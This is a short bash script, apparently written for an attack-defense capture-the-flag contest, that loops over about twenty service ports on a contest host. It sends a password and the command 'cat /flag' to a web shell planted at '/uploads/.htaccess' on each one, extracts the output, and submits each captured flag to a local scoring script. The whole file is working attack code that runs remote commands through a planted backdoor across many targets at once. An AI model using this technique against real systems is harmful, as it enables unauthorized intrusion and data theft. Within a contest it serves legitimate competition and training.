#!/bin/bash

for j in 1 `seq 18 42`
do
	i=$(( $j + 30000 ))
	flag=$(curl -s 'http://chals2.eof.ais3.org:'$i'/uploads/.htaccess' -F 'p=seadog007test1234' -F 'w=cat /flag' | grep -oP '# \K.*') && bash /home/eof2022/score.sh $j "$flag" | jq . &
done
